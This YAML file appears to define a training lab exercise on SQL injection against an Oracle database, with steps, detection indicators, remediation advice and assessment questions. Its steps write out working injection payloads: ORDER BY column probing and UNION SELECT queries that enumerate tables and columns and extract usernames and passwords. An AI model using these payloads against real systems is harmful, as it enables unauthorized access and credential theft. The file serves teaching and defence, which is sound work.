# Category: SQL Injection
name: "SQL injection attack, listing the database contents on Oracle"
id: "sql-injection-list-contents-oracle-001"
category: "sql_injection"
subcategory: "data_extraction"
difficulty: "practitioner"
estimated_time: "60 minutes"

description: |
  This lab contains a SQL injection vulnerability in the product category filter.
  The database is Oracle. The attacker needs to list the contents of the database,
  including table names and column names, and then extract sensitive data. Oracle
  uses `all_tables` and `all_tab_columns` views.

learning_objectives:
  - Understand Oracle-specific views (`all_tables`, `all_tab_columns`)
  - Use UNION attacks to extract table and column names
  - Extract sensitive data from the database

tools:
  - Burp Suite
  - curl
  - sqlmap (optional)

prerequisites:
  - Understanding of Oracle SQL
  - Access to the lab environment

steps:
  - id: "step1"
    phase: "reconnaissance"
    action: "Identify the vulnerable parameter"
    commands:
      - "# Browse to the lab and select a category"
      - "# Intercept the request in Burp Suite"
    expected_output: "The category parameter is used in a SQL query"
    detection: "None"

  - id: "step2"
    phase: "exploitation"
    action: "Determine the number of columns"
    commands:
      - "# Use ORDER BY to find column count"
      - "category=Gifts' ORDER BY 1--"
      - "# Increment until an error occurs"
    expected_output: "Number of columns identified"
    detection: "Database error messages"

  - id: "step3"
    phase: "data_extraction"
    action: "Extract table and column names from Oracle views"
    commands:
      - "# Extract table names"
      - "category=Gifts' UNION SELECT table_name, NULL FROM all_tables--"
      - "# Extract column names"
      - "category=Gifts' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS'--"
      - "# Extract data"
      - "category=Gifts' UNION SELECT username, password FROM users--"
    expected_output: "List of tables, columns, and sensitive data"
    detection: "Database logs may show unusual queries"

compliance_controls:
  - standard: "MITRE ATT&CK"
    control: "T1190"
    description: "Exploit Public-Facing Application"
  - standard: "OWASP"
    control: "A03:2021"
    description: "Injection"

detection:
  network_indicators:
    - "SQL keywords in URL parameters"
  log_indicators:
    - "Database error messages"
  endpoint_indicators:
    - "None"

remediation:
  immediate:
    - "Use parameterized queries"
    - "Restrict database user privileges"
  long_term:
    - "Implement input validation"
    - "Use an ORM"

variables:
  lab_url: "https://lab-id.web-security-academy.net"
  category_param: "category"

assessment_questions:
  - "What is the `all_tables` view used for in Oracle?"
  - "How can you list all columns in a table?"
  - "What is the difference between `all_tables` and `user_tables`?"

references:
  - url: "https://portswigger.net/web-security/sql-injection"
    title: "PortSwigger SQL Injection"
  - url: "https://docs.oracle.com/en/database/oracle/oracle-database/23/refrn/ALL_TABLES.html"
    title: "Oracle ALL_TABLES"